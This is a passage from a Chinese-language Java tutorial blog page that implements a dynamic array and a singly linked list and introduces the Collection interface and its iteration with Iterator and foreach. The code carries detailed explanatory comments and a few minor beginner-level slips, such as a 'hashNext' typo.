class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyArrayList</span> </span>&#123;</span><br><span class="line"><span class="comment">//为什么使用Object，因为只是说这个容器是用来装对象的，但是不知道用来装什么对象。</span></span><br><span class="line"><span class="keyword">private</span> Object[] data;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> total;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyArrayList</span><span class="params">()</span></span>&#123;</span><br><span class="line">data = <span class="keyword">new</span> Object[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加一个元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="comment">//检查是否需要扩容</span></span><br><span class="line">checkCapacity();</span><br><span class="line">data[total++] = obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//如果data满了，就扩容为原来的2倍</span></span><br><span class="line"><span class="keyword">if</span>(total &gt;= data.length)&#123;</span><br><span class="line">data = Arrays.copyOf(data, data.length*<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回实际元素的个数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回数组的实际容量</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">capacity</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> data.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取[index]位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"><span class="comment">//校验index的合理性范围</span></span><br><span class="line">checkIndex(index);</span><br><span class="line"><span class="keyword">return</span> data[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=total)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(index+<span class="string">"对应位置的元素不存在"</span>);</span><br><span class="line"><span class="comment">//throw new IndexOutOfBoundsException(index+"越界");</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换[index]位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, Object value)</span></span>&#123;</span><br><span class="line"><span class="comment">//校验index的合理性范围</span></span><br><span class="line">checkIndex(index);</span><br><span class="line"></span><br><span class="line">data[index] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在[index]位置插入一个元素value</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> index, Object value)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (1)考虑下标的合理性</span></span><br><span class="line"><span class="comment"> * (2)总长度是否够</span></span><br><span class="line"><span class="comment"> * (3)[index]以及后面的元素往后移动，把[index]位置腾出来</span></span><br><span class="line"><span class="comment"> * (4)data[index]=value  放入新元素</span></span><br><span class="line"><span class="comment"> * (5)total++  有效元素的个数增加</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)考虑下标的合理性：校验index的合理性范围</span></span><br><span class="line">checkIndex(index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)总长度是否够：检查是否需要扩容</span></span><br><span class="line">checkCapacity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)[index]以及后面的元素往后移动，把[index]位置腾出来</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 假设total = 5, data.length= 10, index= 1</span></span><br><span class="line"><span class="comment"> * 有效元素的下标[0,4]</span></span><br><span class="line"><span class="comment"> * 移动：[1]-&gt;[2],[2]-&gt;[3],[3]-&gt;[4],[4]-&gt;[5]</span></span><br><span class="line"><span class="comment"> * 移动元素的个数：total-index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.arraycopy(data, index, data, index+<span class="number">1</span>, total-index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)data[index]=value  放入新元素</span></span><br><span class="line">data[index] = value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(5)total++  有效元素的个数增加</span></span><br><span class="line">total++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有实际存储的元素</span></span><br><span class="line"><span class="keyword">public</span> Object[] getAll()&#123;</span><br><span class="line"><span class="comment">//返回total个</span></span><br><span class="line"><span class="keyword">return</span> Arrays.copyOf(data, total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除[index]位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (1)校验index的合理性范围</span></span><br><span class="line"><span class="comment"> * (2)移动元素，把[index+1]以及后面的元素往前移动</span></span><br><span class="line"><span class="comment"> * (3)把data[total-1]=null  让垃圾回收器尽快回收</span></span><br><span class="line"><span class="comment"> * (4)总元素个数减少 total--</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)考虑下标的合理性：校验index的合理性范围</span></span><br><span class="line">checkIndex(index);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)移动元素，把[index+1]以及后面的元素往前移动</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 假设total=8, data.length=10, index = 3</span></span><br><span class="line"><span class="comment"> * 有效元素的范围[0,7]</span></span><br><span class="line"><span class="comment"> * 移动：[4]-&gt;[3],[5]-&gt;[4],[6]-&gt;[5],[7]-&gt;[6]</span></span><br><span class="line"><span class="comment"> * 移动了4个：total-index-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.arraycopy(data, index+<span class="number">1</span>, data, index, total-index-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)把data[total-1]=null  让垃圾回收器尽快回收</span></span><br><span class="line">data[total-<span class="number">1</span>] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)总元素个数减少 total--</span></span><br><span class="line">total--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询某个元素的下标</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(obj == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(data[i] == <span class="keyword">null</span>)&#123;<span class="comment">//等价于 if(data[i] == obj)</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(obj.equals(data[i]))&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除数组中的某个元素</span></span><br><span class="line"><span class="comment">//如果有重复的，只删除第一个</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (1)先查询obj的[index]</span></span><br><span class="line"><span class="comment"> * (2)如果存在，就调用remove(index)删除就可以</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)先查询obj的[index]</span></span><br><span class="line"><span class="keyword">int</span> index = indexOf(obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(index != -<span class="number">1</span>)&#123;</span><br><span class="line">remove(index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不存在，可以什么也不做</span></span><br><span class="line"><span class="comment">//不存在，也可以抛异常</span></span><br><span class="line"><span class="comment">//throw new RuntimeException(obj + "不存在");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(Object old, Object value)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (1)查询old的[index]</span></span><br><span class="line"><span class="comment"> * (2)如果存在，就调用set(index, value)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)查询old的[index]</span></span><br><span class="line"><span class="keyword">int</span> index = indexOf(old);</span><br><span class="line"><span class="keyword">if</span>(index!=-<span class="number">1</span>)&#123;</span><br><span class="line">set(index, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不存在，可以什么也不做</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、单向链表</p><p>包含：</p><p>（1）包含一个Node类型的成员变量first：用来记录第一个结点的地址</p><p>如果这个链表是空的，还没有任何结点，那么first是null。</p><p>最后一个结点的特征：就是它的next是null</p><p>（2）内部使用一个total，记录实际存储的元素的个数</p><p>（3）使用了一个内部类Node</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">    Object data;</span><br><span class="line">    Node next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleLinkedList</span> </span>&#123;</span><br><span class="line"><span class="comment">//这里不需要数组，不需要其他的复杂的结构，我只要记录单向链表的“头”结点</span></span><br><span class="line"><span class="keyword">private</span> Node first;<span class="comment">//first中记录的是第一个结点的地址</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> total;<span class="comment">//这里我记录total是为了后面处理的方便，例如：当用户获取链表有效元素的个数时，不用现数，而是直接返回total等</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 内部类，因为这种Node结点的类型，在别的地方没有用，只在单向链表中，用于存储和表示它的结点关系。</span></span><br><span class="line"><span class="comment"> * 因为我这里涉及为内部类型。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">Object data;<span class="comment">//因为数据可以是任意类型的对象，所以设计为Object</span></span><br><span class="line">Node next;<span class="comment">//因为next中记录的下一个结点的地址，因此类型是结点类型</span></span><br><span class="line"><span class="comment">//这里data,next没有私有化，是希望在外部类中可以不需要get/set，而是直接“结点对象.data","结点对象.next"使用</span></span><br><span class="line">Node(Object data, Node next)&#123;</span><br><span class="line"><span class="keyword">this</span>.data = data;</span><br><span class="line"><span class="keyword">this</span>.next = next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * (1)把obj的数据，包装成一个Node类型结点对象</span></span><br><span class="line"><span class="comment"> * (2)把新结点“链接”当前链表的最后</span></span><br><span class="line"><span class="comment"> * ①当前新结点是第一个结点</span></span><br><span class="line"><span class="comment"> * 如何判断是否是第一个   if(first==null)说明暂时还没有第一个</span></span><br><span class="line"><span class="comment"> * ②先找到目前的最后一个，把新结点链接到它的next中</span></span><br><span class="line"><span class="comment"> * 如何判断是否是最后一个   if(某个结点.next == null)说明这个结点是最后一个</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//(1)把obj的数据，包装成一个Node类型结点对象</span></span><br><span class="line"><span class="comment">//这里新结点的next赋值为null，表示新结点是最后一个结点</span></span><br><span class="line">Node newNode = <span class="keyword">new</span> Node(obj, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//①当前新结点是第一个结点</span></span><br><span class="line"><span class="keyword">if</span>(first == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//说明newNode是第一个</span></span><br><span class="line">first = newNode;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//②先找到目前的最后一个，把新结点链接到它的next中</span></span><br><span class="line">Node node = first;</span><br><span class="line"><span class="keyword">while</span>(node.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//退出循环时node指向最后一个结点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//把新结点链接到它的next中</span></span><br><span class="line">node.next = newNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object[] getAll()&#123;</span><br><span class="line"><span class="comment">//(1)创建一个数组，长度为total</span></span><br><span class="line">Object[] all = <span class="keyword">new</span> Object[total];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)把单向链表的每一个结点中的data，拿过来放到all数组中</span></span><br><span class="line">Node node = first;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line"><span class="comment">//all[i] = 结点.data;</span></span><br><span class="line">all[i] = node.data;</span><br><span class="line"><span class="comment">//然后node指向下一个</span></span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)返回数组</span></span><br><span class="line"><span class="keyword">return</span> all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(obj == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//(1)先考虑是否是第一个</span></span><br><span class="line"><span class="keyword">if</span>(first!=<span class="keyword">null</span>)&#123;<span class="comment">//链表非空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//要删除的结点正好是第一个结点</span></span><br><span class="line"><span class="keyword">if</span>(first.data == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//让第一个结点指向它的下一个</span></span><br><span class="line">first = first.next;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要删除的不是第一个结点</span></span><br><span class="line">Node node = first.next;<span class="comment">//第二个结点</span></span><br><span class="line">Node last = first;</span><br><span class="line"><span class="keyword">while</span>(node.next!=<span class="keyword">null</span>)&#123;<span class="comment">//这里不包括最后一个，因为node.next==null，不进入循环，而node.next==null是最后一个</span></span><br><span class="line"><span class="keyword">if</span>(node.data == <span class="keyword">null</span>)&#123;</span><br><span class="line">last.next = node.next;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">last = node;</span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单独判断最后一个是否是要删除的结点</span></span><br><span class="line"><span class="keyword">if</span>(node.data == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//要删除的是最后一个结点</span></span><br><span class="line">last.next = <span class="keyword">null</span>;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//(1)先考虑是否是第一个</span></span><br><span class="line"><span class="keyword">if</span>(first!=<span class="keyword">null</span>)&#123;<span class="comment">//链表非空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//要删除的结点正好是第一个结点</span></span><br><span class="line"><span class="keyword">if</span>(obj.equals(first.data))&#123;</span><br><span class="line"><span class="comment">//让第一个结点指向它的下一个</span></span><br><span class="line">first = first.next;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要删除的不是第一个结点</span></span><br><span class="line">Node node = first.next;<span class="comment">//第二个结点</span></span><br><span class="line">Node last = first;</span><br><span class="line"><span class="keyword">while</span>(node.next!=<span class="keyword">null</span>)&#123;<span class="comment">//这里不包括最后一个，因为node.next==null，不进入循环，而node.next==null是最后一个</span></span><br><span class="line"><span class="keyword">if</span>(obj.equals(node.data))&#123;</span><br><span class="line">last.next = node.next;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">last = node;</span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单独判断最后一个是否是要删除的结点</span></span><br><span class="line"><span class="keyword">if</span>(obj.equals(node.data))&#123;</span><br><span class="line"><span class="comment">//要删除的是最后一个结点</span></span><br><span class="line">last.next = <span class="keyword">null</span>;</span><br><span class="line">total--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(obj == <span class="keyword">null</span>)&#123;</span><br><span class="line">Node node = first;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(node.data == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Node node = first;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(obj.equals(node.data))&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">node = node.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-3-Collection"><a href="#12-3-Collection" class="headerlink" title="12.3  Collection"></a>12.3  Collection</h2><p>因为集合的类型很多，那么我们把它们称为集合框架。</p><p>集合框架分为两个家族：Collection（一组对象）和Map（一组映射关系、一组键值对）</p><h3 id="12-3-1-Collection"><a href="#12-3-1-Collection" class="headerlink" title="12.3.1 Collection"></a>12.3.1 Collection</h3><p>Collection是代表一种对象的集合。它是Collection系列的根接口。</p><p>它们虽然：有些可能是有序的，有些可能是无序的，有些可能可以重复的，有些不能重复的，但是它们有共同的操作规范，因此这些操作的规范就抽象为了Collection接口。</p><p>常用方法：</p><p>（1）boolean add(Object obj)：添加一个</p><p>（2）boolean addAll（Collection c）：添加多个</p><p>（3）boolean remove(Object obj)：删除一个</p><p>（4）boolean removeAll(Collection c )： 删除多个</p><p>（5）boolean contains(Object c)：是否包含某个</p><p>（6）boolean containsAll(Collection c)： 是否包含所有</p><p>（7）boolean isEmpty()：是否为空</p><p>（8）int size()：获取元素个数</p><p>（9）void clear()：清空集合</p><p>（10）Object[] toArray()：获取所有元素</p><p>（11）Iterator iterator()： 获取遍历当前集合的迭代器对象</p><p>（12）retainAll(Collection c)：求当前集合与c集合的交集</p><h3 id="12-3-2-Collection系列的集合的遍历"><a href="#12-3-2-Collection系列的集合的遍历" class="headerlink" title="12.3.2  Collection系列的集合的遍历"></a>12.3.2  Collection系列的集合的遍历</h3><p>1、明确使用Iterator迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Collection c = ....;</span><br><span class="line"></span><br><span class="line">Iterator iter = c.iterator();</span><br><span class="line"><span class="keyword">while</span>(iter.hashNext())&#123;</span><br><span class="line">    Object obj = iter.next();</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Iterator 接口的方法：</p><p>（1）boolean hasNext()</p><p>（2）Object next()</p><p>（3）void remove()</p><p>2、foreach</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Collection c = ....;</span><br><span class="line"></span><br><span class="line">for(Object  obj :  c)&#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么样的集合（容器）能够使用foreach遍历？</p><p>（1）数组：</p><p>（2）实现了java.lang.Iterable接口</p><p>这个接口有一个抽象方法：Iterator iterator()</p><p>Iterator也是一个接口，它的实现类，通常在集合（容器）类中用内部类实现。并在iterator()的方法中创建它的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 